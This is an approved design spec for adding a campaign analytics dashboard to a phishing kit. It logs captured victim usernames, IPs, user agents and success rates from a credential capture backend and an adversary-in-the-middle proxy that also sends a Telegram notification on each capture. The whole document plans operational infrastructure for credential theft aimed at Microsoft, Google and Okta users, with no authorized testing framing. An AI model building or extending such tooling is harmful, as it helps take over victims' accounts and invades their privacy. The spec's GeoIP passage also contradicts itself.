# Analytics Dashboard — Design Spec

**Date:** 2026-06-19
**Status:** approved

## Overview

Add an analytics dashboard that tracks phishing campaigns: successful/failed deliveries, victim IPs, geo data, and timelines. A separate `analytics-server/` Go binary reads a shared JSONL event log and serves a server-rendered HTML dashboard (no client-side JS).

## Architecture

```
azure-phish-kit/
├── analytics-server/          # NEW
│   ├── main.go                # HTTP server, cache, mtime-based re-read
│   ├── analytics.go           # Stats structs, JSONL parser, aggregator
│   ├── dashboard.html         # Go html/template
│   └── go.mod
├── capture-backend/
│   └── main.go                # MODIFY: append capture events to data/captures.jsonl
├── proxy-server/
│   └── main.go                # MODIFY: append proxy capture events to data/captures.jsonl
├── data/                      # NEW shared directory
│   └── captures.jsonl         # append-only event log
```

**Data flow:**

```
capture-backend ──appends──▶ data/captures.jsonl ◀──reads (mtime-cached)── analytics-server
proxy-server    ──appends──▶                                                  │
                                                                     GET / → HTML page
```

- `data/captures.jsonl` is the integration point between the two capture sources and the dashboard.
- analytics-server only re-reads the file when its `mtime` changes, avoiding per-request full parses.
- At the scales this kit operates at (hundreds to low thousands of captures per campaign), in-memory aggregation with mtime caching is sufficient.

## JSONL Schema

Each line is one JSON object, written as a single line:

```json
{"timestamp":"2026-06-19T14:22:07Z","campaign_id":"abc-123","brand":"microsoft","username":"victim@corp.com","ip":"203.0.113.5","user_agent":"Mozilla/5.0 ...","status":"success","source":"capture"}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `timestamp` | RFC3339 | yes | Capture event time |
| `campaign_id` | string | yes | Campaign UUID or label from the URL payload |
| `brand` | string | yes | `microsoft`, `google`, `okta`, `unknown` |
| `username` | string | no | Submitted username, empty string if not captured |
| `ip` | string | yes | Victim IP from `r.RemoteAddr` |
| `user_agent` | string | no | Browser user agent string |
| `status` | string | yes | `success` (creds captured) or `failed` (page load only) |
| `source` | string | yes | `capture` (landing page POST) or `proxy` (AiTM proxy) |

## Dashboard Sections

All rendered server-side via Go `html/template`. Single page at `GET /`.

### 1. Summary Bar

Four counters across the top:
- **Total Captures** — all events (success + failed)
- **Success Rate** — (successes / total) * 100
- **Unique IPs** — distinct IP count
- **Active Campaigns** — distinct campaign_id count

### 2. Campaign Table

| Campaign ID | Brand | Events | Successes | Failures | Rate | Last Seen |
|---|---|---|---|---|---|---|
| ... | ... | ... | ... | ... | ... | ... |

Sorted by last seen descending.

### 3. Geo Table (IP → Country)

| Country | Count | % |
|---|---|---|
| ... | ... | ... |

Country is resolved from IP at read time using the Go `net` package's built-in CIDR allocations (no external API). Note: Go stdlib does **not** include GeoIP — we use a lightweight embedded MaxMind GeoLite2-Country `.mmdb` file, loaded at startup. If the `.mmdb` file is missing, the geo section shows "Geo database not loaded" and the rest of the dashboard still works.

### 4. Recent Captures (Timeline)

Last 50 captures in a table:
| Time | Campaign | Brand | IP | Country | Username | Status |
|---|---|---|---|---|---|---|
| ... | ... | ... | ... | ... | ... | ... |

Most recent first.

### 5. Auto-refresh

`<meta http-equiv="refresh" content="30">` — page reloads every 30 seconds. No client-side JS needed.

## Reliability

| Concern | Mitigation |
|---------|------------|
| Per-request full parse | mtime cache: analytics-server stats only updated when JSONL file modification time changes. Cache lives in memory. |
| Partial/broken JSON lines | `bufio.Scanner` reads line-by-line. `json.Unmarshal` errors are logged as warnings and the line is skipped. POSIX guarantees atomic writes for single `Write` calls under PIPE_BUF size (~4KB), and these JSON lines are ~300 bytes. |
| Concurrent writers clobbering | capture-backend and proxy-server each open the file with `O_APPEND`. Kernel serializes appends per line. Since each event is one line, this is safe. |
| Geo DB missing | Graceful degradation: geo table shows "not available", everything else renders. |

## capture-backend Changes

In `handleCapture`:

1. Extract campaign_id from the POST params (added to the form by the landing page).
2. After successful capture, append a JSON line to `data/captures.jsonl` with `status: "success"`.
3. On form parse errors or missing creds, append a JSON line with `status: "failed"`.

The landing page (`index.html`) needs one change: include `campaign_id` in the POST form body, extracted from the decrypted URL fragment.

## proxy-server Changes

In `notifyCapture`:

1. Extract campaign_id from the request (bootloader or proxy flow passes it through).
2. After the Telegram notification, append a JSON line to `data/captures.jsonl` with `status: "success"` (proxy only fires on successful capture).
3. Failed events for proxy-server are skipped in v1 — the proxy only fires on successful credential + session captures. There is no equivalent of a "page loaded but didn't submit" signal in the AiTM flow.

## analytics-server Binary

### Startup
1. Read `--port` flag (default `9091`).
2. Read `--data` flag pointing to `data/captures.jsonl` (default `../data/captures.jsonl` relative to binary).
3. Read `--geo` flag pointing to GeoLite2-Country.mmdb (default `../data/GeoLite2-Country.mmdb`).
4. Load GeoIP database (if available).
5. Parse JSONL, aggregate stats, populate cache.
6. Start HTTP server.

### Request Handling
```
GET / → check JSONL mtime → if changed, re-parse and aggregate → render template → 200 HTML
```

### Performance Target
Under 100ms for a JSONL with 10,000 events on modern hardware.

## Testing

- **Unit tests**: `analytics.go` — JSONL parser, aggregation logic, cache invalidation.
- **Integration test**: Write known JSONL, start analytics-server, `curl http://localhost:9091/`, verify HTML contains expected values.
- **Edge cases**: Empty JSONL, missing file, malformed lines, single-event file, missing `.mmdb`.

## Implementation Order

1. Create `analytics-server/` with `go.mod`, `analytics.go`, `dashboard.html`, `main.go`.
2. Modify `capture-backend/main.go` to append JSONL events.
3. Modify `proxy-server/main.go` to append JSONL events (with campaign_id from bootloader/cookie).
4. Modify `landing-page/index.html` to include `campaign_id` in POST form.
5. Write tests.
6. Integration smoke test.
